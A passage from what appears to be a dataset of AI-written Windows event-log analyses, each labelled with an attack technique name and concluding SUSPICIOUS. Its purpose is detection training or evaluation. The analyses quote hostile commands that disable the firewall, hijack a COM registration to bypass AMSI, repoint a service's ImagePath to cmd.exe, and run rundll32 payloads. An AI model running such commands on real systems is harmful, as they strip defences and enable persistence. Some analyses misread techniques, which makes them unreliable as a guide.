  - Strengthen monitoring on Powershell activities and DLL injection attempts across the network.
  - Deploy and routinely update EDR (Endpoint Detection and Response) solutions to catch similar attack vectors in real time. 

"
Add Network Share,"Based on the analysis of the provided Windows event logs, here's a breakdown of observations and findings:

### System Log:
- **Events Related to Time Change:**
  - Multiple Kernel-General (Event ID: 1) events indicate changes in system time. The changes appear minute and consistent with synchronization, possibly with an NTP server. 
  - The use of svchost.exe in conjunction with time change is standard because it hosts services like Windows Time.

- **Event ID 24:**
  - Kernel-General events log system state changes and time zone information, which don't indicate any malicious activity when considered alone.

### Security Log:
- **Security Auditing Event (Event ID: 4616):**
  - Changes in system time are recorded as typically expected for time synchronization events.
  - They show the process ""C:\Windows\System32\svchost.exe"" with the user ""LOCAL SERVICE,"" which generally corresponds to standard operations.

### Sysmon Log:
- **Process Creation & Execution:**
  - Execution of standard Windows utilities like whoami.exe, cmd.exe, and svchost.exe by the user admin_test appears within expected behavior, given there are no unusual command line arguments except for:
    - Use of `cmd.exe` to map network drives and share which could be suspicious if not authorized: `\""cmd.exe\"" /c net use c: \\test\share & net share test=\\test\share /REMARK:\""test share\"" /CACHE:No`.
    - Frequent execution of wevtutil.exe by admin_test, typically used to query or export event logs. Multiple instances may suggest log tampering attempts but require context for confirmation.
  
- **MicrosoftEdgeUpdate.exe:**
  - Executed as a service with a system integrity level, running under NT AUTHORITY\SYSTEM. This looks standard for update processes.

### Conclusion:

1. **Benign Activities:**
   - Time synchronization events.
   - Process executions without peculiar or harmful command-line arguments, except noted cmd.exe actions.

2. **Suspicious Activities:**
   - The use of cmd.exe for network operations could potentially be unauthorized or indicate lateral movement if the user is not expected to perform such actions.
   - Repeated calls to wevtutil.exe require further scrutiny to ensure logs are not being manipulated to hide actions.

### Resolution:
- **SUSPICIOUS**: The observed network mapping activity and potential log manipulation via wevtutil.exe warrant further investigation to confirm whether these actions are authorized and typical for this user.

### Guidance:
- Verify whether the network shares and command usage by 'admin_test' are part of expected behavior for this account.
- Investigate the purpose of multiple `wevtutil` executions.
- Cross-reference with other logs and user activity to validate or dismiss the presence of abnormal behaviors.
- Monitor the system for any additional unauthorized activities or processes."
Create Windows Hidden File with Attrib,"Upon analysis of the Sysmon event log entries, several points stand out which warrant detailed attention:

1. **Context of Events:**
   - The logs are generated on a computer named ""Server002"", and a significant portion of events are executed by a user identified as ""SERVER002\\admin_test"" with high integrity level, indicating administrative privileges.

2. **Command Executions and Behavior:**
   - The logs capture numerous instances of command execution and process spawning, particularly involving `cmd.exe` and other command-line utilities such as `conhost.exe` and `wevtutil.exe`.
   - Specifically, there are sequences of command lines like:
     - `""cmd.exe"" /c IF EXIST %temp%\\data.001.txt ( EXIT 0 ) ELSE ( EXIT 1 )`
     - `""cmd.exe"" /c echo system_Attrib_data.001 >> %temp%\\data.001.txt`
     - `""cmd.exe"" /c attrib.exe +h %temp%\\data.001.txt`
   - The use of `wevtutil.exe`, a Windows Event utility typically related to event log manipulation, is observed alongside operations on files like `data.001.txt` in a temporary directory. It appears to pivot between various processes potentially masking activities.

3. **Process Spawn from `wsmprovhost.exe`:**
   - The `wsmprovhost.exe`, noted as running with `-Embedding`, is a legitimate process related to Windows Remote Management. However, its use as a parent process for many command-line operations could indicate it was used as a covert operator for scripting or telemetry.
   
4. **Batch of Microsoft Edge Update Processes:**
   - A series of processes related to Microsoft Edge Update executed by `NT AUTHORITY\\SYSTEM`, seem consistent with update routines (`MicrosoftEdgeUpdate.exe`). However, they appear frequently and with varied parameters, which suggests either active update cycles or potential abuse if not scheduled normally.

5. **Suspicious Activity Indicators:**
   - The operations touching upon creating or modifying hidden attributes on temporary files, combined with high-frequency operations within short time frames, can be indicators of script use for possibly obfuscating activities or covering tracks.
   - Non-human operated timely execution pattern — such precision and repetitive running of scripts with multiple utility programs indicate automated scripts, potentially malicious if unsanctioned.

6. **Lack of Clear Security or PowerShell Logs:**
   - Absence of these logs could imply attempts to clear them or failure in logging which can accompany malicious activities to prevent detection or traceability.

**Assessment and Conclusion:**

Considering the identified behaviors, the combination of high-integrity privileges, frequent scripting activities with file operations, potential misuse of `wevtutil`, and the absence of background context for these operations (e.g., sanctioned script updates or modifications for maintenance purposes), this scenario warrants deeper scrutiny.

Resolution:
- **SUSPICIOUS:** The activities observed do not conclusively confirm malicious intent, but they necessitate further investigation to rule out compromise or unauthorized use. This includes verifying administrative scripts or tasks that might simulate the observed behavior as a potentially legitimate maintenance operation.

**Guidance for Next Steps:**
- Review scheduled tasks and administrative scripts for `Server002` to validate if such operations were expected as part of a legitimate maintenance cycle.
- Conduct a deeper forensic investigation on `wevtutil` entries and attribute changes with `attrib.exe`.
- Correlate with network logs and other security systems to trace any unusual remote connections or data transfer activities.
- Implement enhanced monitoring and potential isolation for `Server002` pending comprehensive audits."
Blackbit - Disable Windows Firewall using netsh firewall,"### Detailed Analysis

#### System Log
1. **Event ID 7040:** The ""IKE and AuthIP IPsec Keying Modules"" service has been changed from ""demand start"" to ""auto start"". This could be a legitimate system or network configuration change. However, it could also be used by an attacker to ensure persistent access or communication through a VPN or secure channel, especially if the environment does not commonly utilize such services in this manner.

#### Application Log
1. **Event ID 16384:** This event refers to the ""Software Protection Platform Service"". No actionable suspicious activity is inherently identified from this event.

#### Sysmon Log
1. **Execution of `whoami.exe`, `wevtutil.exe`, and `netsh.exe`:**
   - **Whoami.exe:** Typically used for checking the logged-in user. It was executed multiple times by the user `admin_test` with a high integrity level, which can be normal during troubleshooting or checking permissions but suspicious if this activity is out of routine or frequency.
   
   - **Wevtutil.exe:** Used for managing event logs. Observed being called several times. Additionally, the `epl` command to export logs can be benign in legitimate administrative tasks but suspicious if its frequency or pattern is unusual or correlates with other suspicious activities.
   
   - **Netsh.exe:** Noticeably used to disable the firewall with the command `netsh firewall set opmode mode=disable`. This is highly suspicious and indicative of potentially malicious activity. Disabling the firewall can expose the system to unauthorized access and additional threats.

2. **Execution of `cmd.exe`:** Command execution involving firewall settings changes (`netsh firewall set opmode mode=disable`). Given the involvement with the firewall, this activity indeed raises eyebrows and suggests unauthorized or malicious attempts to alter system security configurations.

3. **Service Execution (`svchost.exe`) with High Integrity Level:**
   - The execution as part of `netsvcs` is standard; however, freezing integrity levels running under NT AUTHORITY\SYSTEM suggests typical background operation rather than malicious use, though the context is essential as part of broader activity correlation (e.g., involved IKEEXT service from the system log).

#### Security Log
1. **Event IDs 4624 and 4672:**
   - **4624:** Successful logon, possibly via system processes.
   - **4672:** Special privileges were assigned to SYSTEM processes, which is standard for certain system activities and services but should be analyzed considering overall context and system vulnerabilities.

### Assessment of the Situation
The analysis of these event logs reveals suspicious activities, particularly concerning the change in the firewall settings (through `netsh`) and the export of logs using `wevtutil`. These actions, amid other routine operations, pose a significant risk if they were not initiated by authorized or expected means:

- **Disabling Firewall:** Indicates an attempt to reduce the security posture of the host, possibly to allow further intrusion or data exfiltration.
- **Frequent Execution of `wevtutil`:** Could be aimed at cleaning logs to hide traces of malicious activity.

### Threats and Risks Identified
- Unauthorized modification of security settings which exposes the system to external threats.
- Potential persistence mechanism via service changes.
- Possible data exfiltration or preparatory stage for lateral movement.

### Guidance on How to Proceed
1. **Immediate Actions:**
   - Re-enable and audit firewall settings urgently to prevent potential unauthorized access routes.
   - Review all user accounts for any suspicious access patterns and consider changing credentials if necessary.
   - Check network logs for any indicators of lateral movement or unusual outgoing access.

2. **Investigative Actions:**
   - Examine historical logs prior to the timeframe to establish a pattern of activity.
   - Conduct a thorough forensic investigation to identify any additional compromised systems.
   - Review administrative actions and confirm legitimacy with the responsible personnel.

3. **Preventive Actions:**
   - Enhance monitoring with strategic alerts on unauthorized settings changes or sensitive utility executions.
   - Restrict high-integrity level operations to secure execution contexts, only allowed to explicitly authorized users.

**Resolution:**
- **SUSPICIOUS:** The activities are suspicious and warrant further investigation to confirm the nature and intent of the actions observed in the logs."
Activate Windows NoFind Group Policy Feature,"Upon reviewing the provided Windows event logs, several key observations and analyses are detailed below:

### Observations:

1. **Software Protection Platform Service (SPP) Log**:
   - There is an entry from the Software Protection Platform Service, which typically manages activation and licensing. There is nothing inherently suspicious in this log entry.

2. **Sysmon Logs**:
   - **Repeated Execution of `wevtutil.exe` and `conhost.exe`**: 
     - `wevtutil.exe` is a legitimate utility used to manage Windows Event logs. Frequent execution without command line arguments can indicate potential log manipulation or reconnaissance attempts.
     - `conhost.exe` is another legitimate Windows process associated with Console Windows Host used by command-line interfaces, such as CMD.
     - In these logs, these processes were executed multiple times within milliseconds and all under the same user `SERVER002\admin_test`. The context does not immediately imply malicious activity but is somewhat unusual without a clear purpose.
   - **Execution of `cmd.exe` with Registry Modification**:
     - There is an execution of `cmd.exe` with the command line argument that modifies the registry (`reg add ... /v NoFind`). This can be indicative of an attempt to disable Windows search functionality, which might be a tactic used to restrict system usability or evade discovery.
   - **Execution of `whoami.exe`**:
     - This is a standard utility used to display the current user information. While its use can be benign, it’s often part of reconnaissance in a compromised environment to check user permissions and roles.
   - **Execution of `hostname.exe` and Legitimate Windows Updates**: 
     - The logs also reflect benign activity related to normal system operations, like updating Microsoft Edge.

3. **Security Logs**:
   - No direct indications of unauthorized access or privilege escalation within the captured security event logs.

4. **System Logs**:
   - Time change events were logged (`EventID 4616`), which suggests that the system time was adjusted. This can sometimes be associated with attempts to alter timestamps to potentially obfuscate activity, though it is done by a legitimate service (`svchost.exe`).

### Assessment:

- The registry key modification (`cmd.exe /c reg add`) to disable search and the frequent, rapid execution of system utilities with no command-line arguments are activities that stand out. Such activities, especially registry modifications without clear administrative intent, could suggest suspicious activity.
  
- Reconnaissance actions like using `whoami.exe` and making registry changes can be early indicative steps in malicious campaigns, yet by themselves, without additional indicators of compromise like unusual network traffic, file changes, or specific malware signatures, they do not definitively indicate a breach.

### Recommendation:

1. **Resolution: SUSPICIOUS**
   - The activities described require further investigation. Particularly, the reason for registry modifications and frequent execution of event utility tools without clear administrative tasks should be clarified.
   - Verify with the involved admin user (`admin_test`) and the security team if there were any intended administrative tasks conducted at the time.
   - Conduct an audit trail of user actions around the timestamp of these events to ensure there are no broader malicious activities.
   - Review additional logs (network, file system, antivirus) for correlating evidence of compromise to rule out undetected malicious activity."
InstallUtil HelpText method call,"Upon analyzing the provided log entries from the Windows PowerShell and Sysmon logs, the following observations and analysis can be made:

### PowerShell Log Analysis:

1. **PowerShell Execution:**
   - Multiple PowerShell events indicate the execution of scripts or commands involving potentially unusual behavior or script execution. The scripts being executed reference a `InstallUtilTestHarness.ps1` script and attempt to load a DLL `data.004.dll`.

2. **Commands Involving InstallUtil:**
   - The presence of `InstallUtil.exe` processes in the logs is noteworthy. InstallUtil is a legitimate tool used to install .NET assemblies, but it can be co-opted by malicious actors to load and execute code, commonly seen in Living off the Land (LotL) techniques.
   - The command that includes `/?“ on the `InstallUtil.exe` is suspicious, as it might indicate an attempt to misuse this binary.

3. **Script Execution and Error Messages:**
   - The events indicate that PowerShell commands are creating files and executing code, with some error checking mechanisms (`if ($ActualOutput -ne $ExpectedOutput)` indicates script logic being executed).
   - The PowerShell command logs indicate detailed manipulation and testing of outputs, which is not common for regular use.

4. **Use of Temporary Files:**
   - The use of temporary directories for storing and executing code frequently appears in malware behavior to avoid detection and remain persistent across different sessions.

### Sysmon Log Analysis:

1. **Process Activity:**
   - There are several entries indicating the execution of processes like `powershell.exe`, `csc.exe` (C# Compiler), `installutil.exe`, `wevtutil.exe`, etc. under the same `admin_test` user.
   - The invocation of `csc.exe` and `InstallUtil.exe` suggests dynamic code compilation and loading, which is highly indicative of potentially harmful behavior.

2. **Integrity Level and User Context:**
   - The processes are running with high integrity levels and under the administrative user context `SERVER002\admin_test`, which may indicate privilege that can lead to elevated and potentially dangerous actions.

### Conclusion and Assessment:

- ***Risk Indications***: The behavior captured in the logs suggests the use of PowerShell and .NET tools in a scripted, automated manner to execute code, possibly compile dynamic scripts, and perform actions that are consistent with software tests or penetration testing exercises. However, given the nature of PowerShell and these utilities being used in a potentially stealthy manner, these actions could also signal obfuscated malware activities.

- ***Resolution***: **SUSPICIOUS**
  - The use of PowerShell scripts to load DLLs via `InstallUtil`, the creation and execution from temporary files, and dynamic command execution are red-flags for potentially nefarious activities.
  - Further investigation is required to determine if these scripts are part of authorized testing or deployment practices, or if they represent malicious compromise efforts.

### Next Steps:

1. **Verify Intent and Authorization:**
   - Check with stakeholders or the system’s administrative records to see if these actions were part of a scheduled task, software testing, deployment process, or an authorized penetration test.

2. **Endpoint and Network Monitoring:**
   - Monitor the system for any additional suspicious activities and lateral movement attempts.
   - Review network traffic for connections to known malicious IP addresses or domains.

3. **Perform a Full Security Audit:**
   - Conduct a thorough security audit of user accounts with administrative privileges, especially `admin_test`.
   - Assess other endpoints in the same network for similar patterns of behavior.

This approach will validate the legitimacy of actions taken and determine whether further escalation, containment, and mitigation steps are necessary."
AMSI Bypass - Override AMSI via COM,"### Analysis of Logs:

#### 1. Sysmon Log Analysis
- **Whoami Execution:** There are multiple instances of `whoami.exe` and `hostname.exe` being executed by the user `SERVER002\\admin_test`. This activity appears to be normal under high integrity context, possibly indicative of administrative tasks or scripts checking the identity or configuration of the system.

- **Conhost.exe Pattern:** Accompanying all of the instances of command executions like `whoami.exe` and `hostname.exe`, `conhost.exe` is spawned. This is a standard Windows console host used to run these applications and is expected behavior. No unusual command-line arguments are associated with these processes.

- **Unexpected Registry Modification:**
  - A `cmd.exe` command is executed with a suspicious registry addition using `reg.exe`:
    ```
    ""cmd.exe"" /c REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f
    ```
  - This attempts to modify the registry to reference a non-existent DLL, which may indicate a persistence mechanism or a setup for DLL hijacking. Such entries in non-standard locations and referencing non-existent files are often used by malware to establish persistence.

- **Wevtutil.exe Usage:** Several instances of `wevtutil.exe`, a legitimate tool used to manage event logs, are executed, but without further context, this appears benign unless part of a malicious cleanup process.

#### 2. System Log Analysis
- **Time Change Events:** There are legitimate time correction events provided by `svchost.exe` sourcing time from an NTP server `time.windows.com`. This is typically normal for maintaining system clock accuracy and does not indicate any problematic actions.

#### 3. Application Log Analysis
- **Edge Update Activity:** Several instances of Edge update processes are logged. Edge updates are legitimate operations, given its signed processes and expected behaviors. These can be generally considered benign unless explicitly linked to malicious downloads or executions, which this log does not indicate.

#### 4. Security Log Analysis
- **Time Change by LOCAL SERVICE:** Corresponds to the System log changes indicating `LOCAL SERVICE` ajusting the system time. This corroborates the benign nature of time adjustment events.

### Conclusion:
- **Benign Activities:** Identity checks and system information (like `whoami.exe` and `hostname.exe`) are common for system administrators performing audits or basic maintenance.
  
- **Suspicious Activity:** The registry modification attempt is suspicious due to references to a non-existent DLL. This requires further investigation to determine the intent and source of this command inclusion.

### Final Resolution:
- **SUSPICIOUS** - While there are many benign entries within these logs, the execution of the `cmd.exe` with the peculiar registry modification action is out of ordinary and could point towards potentially malicious behavior depending on the surrounding circumstances and context not captured in this log. Investigation into the source and potential exploitation of this registry action is warranted. 

### Guidance for Further Investigation:
- Probe `admin_test` user's activity around that timeframe. 
- Search for the presence of any autorun registry entries or scheduled tasks corresponding to `admin_test`.
- Verify the existence of `C:\IDontExist.dll` or similar files.
- Check for anomalies in network traffic or file operations during this period of activity."
Compile After Delivery using csc.exe,"### Detailed Analysis of Windows Event Logs

#### System Log:
- The System log shows routine updates for the Microsoft Defender Antivirus, indicating system stability and maintenance. This is a common and expected behavior for maintaining security intelligence volumes. There are no signs of anomalies here.

#### Security Log:
- **EventID 4624** (Successful Logon): 
   - The user `admin_test` successfully logged in using NTLM authentication. The workstation name `DESKTOP-3HL5B2P` and IP address `192.168.0.102` were recorded. 
   - Logon Type 3 indicates a network logon, which is common for accessing resources in a networked environment. 
   - The use of NTLM under certain circumstances might raise suspicion in a hardened environment, but it is not independently indicative of a compromise.

- **EventID 4672** (Special Privileges Assigned): 
   - The `admin_test` user appears to have been granted several high-level privileges, including SeDebugPrivilege and SeTakeOwnershipPrivilege, aligning with administrator role responsibilities.

- **EventID 4634** (Logoff):
  - Indicates a logoff by the `admin_test` user, aligning with normal user activity after a session has ended.

- **EventID 5379** (Credential Validation):
  - Several attempts were made to access Windows Live services with a return code suggesting failure or permission issues. The return code `3221226021` corresponds to `STATUS_LOGON_FAILURE`, but without context, this alone is not clearly suspicious.

#### Sysmon Log:
- **Sysmon EventID 1 and 5** (Process Creation/Termination):
  - Several processes such as `powershell.exe`, `cmd.exe`, and `whoami.exe` were executed under the control of the user `admin_test`. The use of PowerShell and command line tools is not inherently malicious but can be used for scripting and administrative tasks.
  - During the detailed events, the `cmd.exe` was invoked to run `csc.exe` — the C# compiler — to output an executable `data.004.exe`. This could signal a compilation of a source file into an executable, which might be suspect depending on context as it can potentially be used for payload delivery in a compromise scenario.

  - For verification, the parameters and specific execution context should be looked at closer—since it might denote the execution of potentially unwanted or custom code.

#### Final Assessment:
- **Assessment**: The use of high-level privileges, network logons via NTLM, and activities surrounding the compilation of C# source files raise questions about potential malicious activities.
- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Review User Activities**: Investigate the purpose behind the `admin_test` user's activities, especially the creation of new executables using the C# compiler. Verify if this is part of legitimate development or script usage.
2. **Network Activity**: Review network logs to identify other interactions from the workstation `DESKTOP-3HL5B2P` to see if similar suspect activities are occurring elsewhere.
3. **Privilege Management**: Confirm if the high-level privileges assigned to `admin_test` are necessary and authorized and review role assignments in Active Directory.
4. **Malware Scan**: Perform an immediate malware scan on the server and associated workstation to ensure there are no breaches.
5. **Policy Review**: Ensure that strict policies and monitoring for unusual script execution and high-privilege activities are enforced.

These action items should help clarify if these events are coordinated within internal maintenance routines or indicate inadvertent exposure to potential threats. Further investigation into user objectives and monitoring is warranted to close any security gaps."
Rundll32 with Ordinal Value,"Based on the provided logs, I've conducted a thorough analysis to identify any suspicious or anomalous behavior that might indicate malicious activity. Here are the key findings and analysis points:

1. **Security Log Events:**
   - **Event 4624:** Successful logons were observed in multiple entries, both with logon type 5 and type 3. Logon type 5 typically indicates a service logon, which is legitimate for SYSTEM accounts. Meanwhile, logon type 3 indicates a network logon. The ""admin_test"" account engaged in network logons from ""DESKTOP-3HL5B2P,"" which is worth noting for any later anomalies.
   - **Event 4672:** Privileged logons were recorded for the ""admin_test"" user. This includes SeDebugPrivilege and other high-privilege levels, which can be leveraged for malicious activity such as process injection or privilege escalation.
   - **Event 4799:** A process related to Microsoft Edge Update (""setup.exe"") is recorded, but this appears to be part of Microsoft Edge update activities. 

2. **Sysmon Log Events:**
   - **Process Executions:** There are numerous process creation logs for what appears to be routine software operations, largely involving Microsoft Edge updates, which are legitimate.
   - **Suspicious Use of rundll32.exe:** A command executed by cmd.exe involves using rundll32.exe to execute a DLL located in a user’s temp directory. This is often a technique used by malware to execute or hide malicious payloads (e.g., ""rundll32.exe ... AllTheThingsx64.dll,#2""). The presence of potentially malicious DLL execution signifies suspicious behavior and often indicates an attempt at executing unauthorized code.
   - **Excessive Use of cmd.exe and PowerShell:** The presence of cmd and PowerShell sessions can indicate the execution of custom scripts or potentially malicious commands, albeit the PowerShell session here appears unanalyzed.

3. **Application Log and Others:**
   - **General Application Logs:** These logs primarily show standard operation and aren't directly concerning, though they contribute to the environmental context (e.g., Software Protection Platform activities).

**Assessment and Resolution:**

- **Anomalous Observations:** The presence of high-privileged command executions, network logons from potentially unusual workstations, and the use of rundll32.exe associated with a user’s temp directory are key red flags.
  
- **Conclusion:** Based on the combination of typical patterns for lateral movement and potential execution of unauthorized scripts, the logs demonstrate clear SUSPICIOUS activity that necessitates further investigation. The use of high-privilege logs and executable paths suggests potential compromise that hasn't been fully confirmed as malicious due to lack of additional context about the files and associated behaviors.

**Guidance on Proceeding:**
- **Further Investigation Required:** Verify the legitimacy and source of the DLL (""AllTheThingsx64.dll"") involved in the rundll32 execution.
- **Behavioral Monitoring:** Closely monitor accounts showing privileged activity, especially ""admin_test,"" and network connections to external systems or workstations for anomalous behavior.
- **Threat Hunting:** Engage in threat hunting activities to monitor for similar indicators across the environment and ensure robust endpoint detection mechanisms are in place.
- **Security Posture Enhancement:** Consider strengthening authentication policies and implementing additional logging for deeper context and immediate detection of privilege misuse or unauthorized scripts."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"After thoroughly analyzing the provided Windows event logs, the following observations and conclusions have been made:

### Anomalous and Suspicious Behavior:

1. **Use of Plink.exe:**
   - A `cmd.exe` process was observed executing a command involving `plink.exe`, which is commonly used to establish SSH connections. The command-line argument includes a login attempt with credentials (`-l ""root""` and `-pw ""pass""`) to a host named `file.local`.
   - **EventID 1** with `Image` set to `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\plink.exe` and command line includes `-ssh -l ""root"" -pw ""pass""`.
   - This use of plaintext login credentials in scripts is highly suspicious and suggests that someone may have attempted unauthorized access or automated a task involving remote systems.

2. **Execution of PowerShell and Wevtutil:**
   - A `PowerShell.exe` process was identified, followed by multiple executions of `wevtutil.exe`.
   - **EventID 5** with `Image` set to `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`.
   - `wevtutil.exe` is used for managing event logs, and its usage in conjunction with PowerShell spikes suspicion, especially if not justified by routine administrative tasks.

3. **Command Execution From Temp Directory:**
   - The suspicious use of `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\src\\esx_community_supported.txt`, potentially indicative of script or payload execution from a temporary folder. It's common for malicious activities given the typical permissions and transient nature of temporary directories.

4. **Account Privileges and Logon:**
   - Multiple `Logon (Event ID 4624)` and `Special Logon (Event ID 4672)` events related to `SYSTEM` account.
   - These events reflect standard system privileges, but if any coincide with anomalous behavior, they may warrant further investigation.

5. **Frequent Usage of conhost.exe:**
   - Several `conhost.exe` (Console Host) activities without a clear indication of interactive use could imply concealed console command operations or malicious activity attempting to blend in as legitimate system processes.

### Conclusion:

Given the observations regarding the attempt to use `plink.exe` along with suspicious interaction with temporary directories and scripting, I am inclined to categorize this situation as **SUSPICIOUS**. There is no definitive evidence proving malicious intent due to the lack of detailed context/content within scripts executed, but the behavior is certainly anomalous and warrants further investigation.

### Recommendations:

- **Investigate the `plink.exe` Usage:**
  - It is crucial to determine the intent and origin of this connection attempt. Verify whether this is a sanctioned penetration test activity or unauthorized access.
  - Identify if there are any scheduled tasks or logs outside the provided set that correlate with this activity.

- **Review PowerShell Scripts and Wevtutil Usage:**
  - Review PowerShell usage patterns and command history for any unauthorized scripts, especially those logging or altering events.
  - An audit on log management activities using `wevtutil` should be conducted ensuring legitimate purpose.

- **Monitor User Accounts and Privileges:**
  - Examine newly created or modified accounts and the list of privilege assignments during these events for any unexplained elevation of privileges.

- **Conduct Endpoint Investigation:**
  - A thorough investigation on `Server002` should be conducted using an endpoint protection tool with advanced detection capabilities including behavioral analysis.

**Resolution: SUSPICIOUS** – The events are suspicious and require additional scrutiny to ensure they do not represent a security compromise."
Service ImagePath Change with reg.exe,"After thoroughly analyzing the provided event logs, here is the detailed assessment of suspicious activities:

1. **PowerShell Execution (Sysmon Log)**:
   - EventID 5 indicates executions of PowerShell instances under the user ""SERVER002\admin_test"".
   - PowerShell is a powerful scripting language often used by attackers for lateral movement, credential dumping, or other malicious activities.

2. **Registry Modification via Command Line (Sysmon Log)**:
   - There is a suspicious `cmd.exe` process with a command line executing `reg.exe` to add a registry entry under `HKLM\SYSTEM\CurrentControlSet\Services\calcservice`.
   - This is particularly concerning as it indicates a system service modification which attackers often use to establish persistence.
   - The entry modifies the `ImagePath` to `cmd.exe`, potentially allowing arbitrary command execution with system service privileges.

3. **Usage of `wevtutil.exe` (Sysmon Log)**:
   - Several instances of `wevtutil.exe` execution are recorded.
   - `wevtutil.exe` is used to manage event logs and is sometimes leveraged by attackers to clear logs to cover their tracks.

4. **Console Host Executions (Sysmon Log)**:
   - Multiple occurrences of `conhost.exe` suggest potential command-line tool activity, possibly implying manual command execution by a user or script.

5. **Process Execution of Core Windows Components**:
   - Frequent execution of processes like `whoami.exe`, `hostname.exe`, and `cmd.exe` for utility operations seems consistent with reconnaissance or initial compromise workflow.

Based on the patterns observed, especially the registry modification targeting a system service and prolific PowerShell and `wevtutil.exe` usage, the behavior is suggestive of potential compromise or attempts related to privilege escalation and persistence. 

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a deeper investigation into the affected machine focusing on persistence mechanisms, unauthorized registry changes, and unnecessary services.
- Review any PowerShell scripts or execution logs for suspicious commands.
- Check for any abnormal user account activities, especially under `SERVER002\admin_test`.
- Isolate the host if necessary to prevent potential lateral movement.
- Consider performing a comprehensive incident response including checking for known IOCs and lateral movement indicators.
- Verify through forensic examination and memory analysis tools if any malicious payloads were executed or if there are remnants of malware.
- As an immediate response, considering rolling back or analyzing changes made to system services and examining the network connections and traffic for outbound connections that might indicate data exfiltration or C2 communications."
Microsoft.Workflow.Compiler.exe Payload Execution,"### Analysis of the Logs:

#### Overview:
The logs provided include Sysmon, Security, Application, and Windows PowerShell logs, presenting a detailed sequence of events on Server002. This analysis focuses on identifying any unusual or potentially malicious activities based on these logs.

#### Suspicious Findings:

1. **Use of PowerShell and Workflow Compiler**:
   - A PowerShell execution is observed with a command line invoking `microsoft.workflow.compiler.exe` on a `data.xml` file. This is captured in multiple logs, including Sysmon (EventID 1) and Windows PowerShell logs.
   - The PowerShell script executed a .NET assembly, which raises suspicion particularly in the context of lateral movement or data exfiltration.
   - The execution of `microsoft.workflow.compiler.exe`, recorded in the Application log, was terminated due to a `System.IO.DirectoryNotFoundException`, which led to a Windows Error Report.

2. **Execution of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` were executed by an `admin_test` account. The utility is generally used for manipulating event logs, which can be indicative of log tampering or cleaning attempts usually associated with post-exploitation cleanup actions.

3. **Pattern of Processes**:
   - There is a pattern of short intervals between various conhost, werfault, and other processes initiated, often indicative of automated script activities.

4. **Privileged Access**:
   - Security logs reveal privilege escalation events (EventID 4672), with SYSTEM gaining high-level privileges, including `SeDebugPrivilege`. While normal for some operations, it merits attention in the context of other suspicious activities in the logs.

#### Benign Activity:
- Repeated execution of `MicrosoftEdgeUpdate.exe` is consistent with regular software updates and does not inherently indicate malicious activities.

#### Recommendation:
Given the combination of suspicious PowerShell activity, potential log manipulation attempts with `wevtutil.exe`, and .NET assembly execution failure, it is advised to escalate this for further investigation.

#### Resolution:
**SUSPICIOUS**

Further actions:
- **Network Segmentation**: Isolate the affected machine temporarily to prevent potential lateral movement.
- **In-depth Analysis**: Conduct a thorough examination of the involved PowerShell scripts and monitor ongoing process executions.
- **File Integrity**: Check for unauthorized modifications, especially focused on the scripts executed via PowerShell.
- **Security Audit**: Review permissions and recent activities associated with the `admin_test` account to ensure it has not been compromised."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"Based on the detailed examination of the provided log events, here's a synthesis of findings:

### Overview of Log Events:
1. **Application Log:**
   - Multiple edge update service stoppages and Software Protection Platform service events are present. These seem to be related to regular software update activities.
   
2. **System Log:**
   - Time adjustments and kernel general events are observed, typically handled by system processes like `svchost.exe`.
   - Time source synchronization appears to be operating as expected, indicating possible routine maintenance or adjustment.

3. **Sysmon Log:**
   - Numerous process creations related to `MicrosoftEdgeUpdate.exe`, `wevtutil.exe`, `cmd.exe`, `reg.exe`, `whoami.exe`, and respective console hosts (`conhost.exe`).
   - The sequence involving `cmd.exe` and `reg.exe` hints at registry modifications under `HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor`, which draws attention.
   - The presence of `cmd.exe` executing registry modification commands, potentially disabling a secondary authentication device, raises questions about the legitimacy of this action. 

4. **Security Log:**
   - Standard security events include logons by the user `admin_test` and several privilege allocations indicating potential activities requiring elevated permissions.
   - Event ID 4624 (Successful Logon) using NTLM authentication from a non-standard IP (192.168.0.102), paired with privilege escalation (4672), suggests a potential lateral movement.

### Analysis:
- **Suspicious Behavior:**
  - The use of `cmd.exe` followed by `reg.exe` for registry modification (Event: `HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor`) might be a tactic to weaken system security by disabling secondary authentication.
  - Elevated privileges such as `SeDebugPrivilege` and `SeImpersonatePrivilege` logged (4672) show admin-level capabilities being utilized, which could be benign administration activities but bear further scrutiny when context is unclear.
  - The administrative user `admin_test` generates concern if this behavior is not expected or typical for this user account.

- **Indicators of Potential Compromise:**
  - The combination of elevated privileges with registry editing operations can mirror tactics used in compromising actions where attackers silence security controls or preparation for further exploitation occurs.
  - The source IP logon (`192.168.0.102`) using NTLM could be valid internal access, but any discrepancies with expected usage warrant checking.

### Resolution:
Given the suspicious registry change activity and associated elevated privileges, accompanied by potential non-standard administrative actions from the `admin_test` account, the logs warrant further investigation to confirm legitimacy. The registry operations and privilege assignments should be cross-referenced with authorized change or deployment activities.

**Resolution: SUSPICIOUS**

### Guidance:
1. **Investigate & Verify:**
   - Verify if the registry modification and use of elevated privileges were expected and documented administrative activities.
   - Correlate `admin_test` account activity involving NTLM logins with legitimate administration and maintenance workflows.
   
2. **Monitor & Audit:**
   - Continue monitoring for further similar log events that indicate if actions are exploratory or indicative of deeper system penetration tactics.
   - Conduct an audit on accounts with elevated privileges and compare against recent configuration or access changes.

3. **Next Steps:**
   - If uncertainty persists on the legitimacy of these activities, consider temporary restrictive measures on the `admin_test` account.
   - Engage with network logs and system administrators to explore the context of the external connection from the IP address noted.

This analysis should guide your decision in either de-escalating or further scrutinizing the potential deviations flagged in this log set."
Rundll32 execute payload by calling RouteTheCall,"Upon analyzing the provided Windows event logs, several aspects stand out that warrant further discussion:

### Investigation Summary:

1. **PowerShell Logs:**
